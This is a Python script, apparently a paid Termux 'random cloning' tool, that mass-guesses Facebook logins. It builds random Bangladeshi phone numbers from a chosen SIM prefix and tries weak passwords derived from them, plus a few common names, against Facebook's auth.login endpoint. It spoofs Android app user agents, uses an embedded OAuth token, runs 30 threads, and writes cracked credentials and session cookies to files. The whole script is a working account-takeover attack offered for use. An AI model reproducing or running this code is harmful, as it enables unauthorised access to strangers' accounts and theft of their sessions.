#WRITTEN BY MR.FUCKER-404
#FOLLOW : https://github.com/FUCKER-404
#------------- import -------------#
import os,sys,time,urllib3,json,random,re,string,platform,base64,uuid
from os import system as clr
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json
#-----------------------------[KEY]----------------------------#
def mpk():
    uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
    id = "".join(uuidd).replace("_","").replace("50","MAHFUZ").replace("u","3").replace("a","M")
    plat = platform.version()[9:][:14][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
    bxd = "MAHFUZ~"
    bumper = bxd+id+('==')
    return bumper
  
#-----------------------------[USER-AGENT]----------------------------#  
def uaa():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/419.0.0.67.59;FBBV/692042011;FBRV/0;FBPN/com.facebook.katana;FBLC/bn_IN;FBMF/iPhone 6s Plus;FBBD/iPhone 6s Plus;FBDV/iPhone 6s Plus;FBSV/11;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
        return ua

sazzad = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
def uaa():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/{density=2.25,width=720,height=1280};FBLC/it_IT;FBRV/256855919;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+str(sazzad)+';FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
        return ua
#-------------color----------------#
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H,M]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0
os.system('xdg-open https://github.com/Fucker-404')
#-------------logo-----------------#
logo=(f'''{P}
█▀▀  █░█ █▀▀ █▄▀ █▀▀  █▀█ ▄▄ █░█ █▀█ █░█
█▀░  █▄█ █▄▄ █░█ ██▄  █▀▄ ░░ ▀▀█ █▄█ ▀▀█
{warna}--------------------------------------------{B}
 {C}TOOL BY      {B}:   {C}MAHFUZ{B}
 {C}GITHUB       {B}:  {C} FUCKER-404 {M}
 {C}FACEBOOK ID{B}:  {C} Mahfuz ヽ・　T.T {H}
 {C}FACEBOOK GROUP{P}:   {C} TERMUX TOOL BY MAHFUZ{H}
 {C}STATUS       {B}:   {B}F{C}/{B}R{C}/{B}E{C}/{B}E{M} •{warna}[{H}TEST{warna}]{M}•{warna}
--------------------------------------------{B}''')
#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')
#-------------clear def -------------#
def clear():
    clr('clear')
    print(logo)
#-------------main def------------#
def MR_FUCKER():
    clear()
    os.system('xdg-open https://m.facebook.com/groups/1060774804926904')
    print(f'{B} [{warna}1{B}]{C} RANDOM CLONING ')
    print(f'{B} [{warna}0{B}]\033[38;5;200m EXIT ')
    linex()
    option=input(f' {B}[{warna}~{B}] {C}CHOICE MENU >> ')
    if option in ['01','1']:
        BD_CLONING()
    else:
        exit(' THANKS FOR USING :)')
#------------- bd clone def ----------#
def BD_CLONING():
    user=[]
    clear()
    print(f'{C} EXAMPLE {B}:{M} [016] [017] [018] [019]')
    code=input(f' {C}CHOICE {B}>>{M} ')
    linex()
    print(f' {C}EXAMPLE {B}:{M} [100] [200] [500] [10000]')
    try:
        limit=int(input(f' {C}CHOICE {B}>>{M} '))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as mahfuz:
        tl=str(len(user))
        print(f' {C}YOUR SIM CODE : {B}'+code)
        print(f' {C}TOTAL ACCOUNT :{B} '+tl)
        print(f' {C}PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat','freefire']
            mahfuz.submit(method_crack,ids,passlist)
    linex()
    print(f' {C}THE PROGRESS HAS BEEN COMPLETE ')
    print(f' {C}TOTAL OK ID :{B} '+str(len(oks)))
    print(f' {C}TOTAL CP ID :{B} '+str(len(cps)))
    input(f' {C}PRESS ENTER TO BACK  : ')
    MR_FUCKER()
#------------ method crack def ---------#
def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[\033[1;32mMAHFUZ\033[1;37m]\033[1;32m-\033[1;37m[\033[1;32m%s\033[1;37m]\033[1;32m-\033[1;37m[\033[1;32mOK\033[1;37m]-\033[1;37m[\033[1;32m%s\033[1;37m]'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': uaa(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;37m[\033[1;32mOK-FUCKER-404\033[1;37m]\033[1;32m '+ids+' \033[1;37m|\033[1;32m '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;37m [\033[1;32mCOOKI\033[1;37m]\033[1;32m~> \033[1;37m'+coki)
                    open('/sdcard/OK-FUCKER-404.txt','a').write(ids+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[CP-FUCKER-404] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/CP-FUCKER-404.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#-----------------------------[APPRUVAL]----------------------------#
def approval():
    SMO=mpk()
    PANTHER=requests.get("https://raw.githubusercontent.com/Fucker-404/Approval-/main/Approve. txt").text
    if SMO in PANTHER:
        MR_FUCKER()
    else:
        clear()
        print(f'{B} [{warna}~{B}]{C} YOUR KEY \033[1;37m-> \033[33;1m'+SMO)
        linex()
        print(f'     {C}TOOL IS PAID')
        print(f'{B} [{warna}~{B}]{C} OK ID JUST NOW LOGIN ')
        print(f'{B} [{warna}~{B}]{C} BD RANDOM CLONING')
        print(f'{B} [{warna}~{B}]{C} ONLY OK ID / CP REMOVE')
        input(f'{B} [{warna}~{B}]{C} ENTER TO BUY')
        tks = ('HELLO%20SIR%20!%20PLEASE%20APPROVE%20MY%20KEY%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20THE%20KEY%20IS%20:%20'+SMO);os.system('am start https://wa.me/+8801729789847?text='+tks),
        approval()   
#-------------end----------------#
approval()
